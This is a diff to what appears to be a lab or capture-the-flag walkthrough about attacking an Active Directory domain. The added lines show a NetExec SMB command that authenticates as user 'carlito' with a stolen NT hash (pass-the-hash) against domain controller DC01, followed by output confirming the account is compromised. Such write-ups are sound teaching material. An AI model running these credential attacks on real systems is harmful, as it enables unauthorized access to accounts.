@@ -719,5 +719,10 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 I now have the users NT hash
 
 ```python
-
+nxc smb dc01.casper.hsm -u 'carlito' -H '16a366acd9634ee5f958ebf1b4fc11df' --smb-timeout 5     
+SMB         10.0.31.82      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:casper.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.31.82      445    DC01             [+] casper.hsm\carlito:16a366acd9634ee5f958ebf1b4fc11df
 ```
+
+This user is now compromised!
+
